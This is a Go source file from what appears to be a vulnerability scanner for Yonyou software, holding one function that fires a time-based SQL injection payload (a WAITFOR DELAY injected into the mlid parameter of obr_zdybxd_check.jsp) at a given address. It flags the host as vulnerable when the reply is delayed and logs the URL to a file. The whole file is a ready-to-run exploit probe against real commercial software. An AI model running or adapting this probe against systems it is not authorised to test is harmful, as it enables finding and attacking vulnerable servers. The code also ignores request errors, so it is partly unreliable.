package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"log"
	"net/http"
	"time"
)

func Obr_zdybxd_checkScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	Obr_zdybxd_checkScan := "用友 GRP U8 obr_zdybxd_check.jsp SQL注入漏洞"
	urls := address + "/u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:5%27--"
	startTime := time.Now()
	response, _ := client.Get(urls)
	defer response.Body.Close()

	// 读取响应内容
	//body, _ := ioutil.ReadAll(response.Body)

	elapsedTime := time.Since(startTime)

	if elapsedTime.Seconds() > 4 {
		result := Obr_zdybxd_checkScan + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, Obr_zdybxd_checkScan, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, Obr_zdybxd_checkScan)
		fmt.Println(output)
	}
}
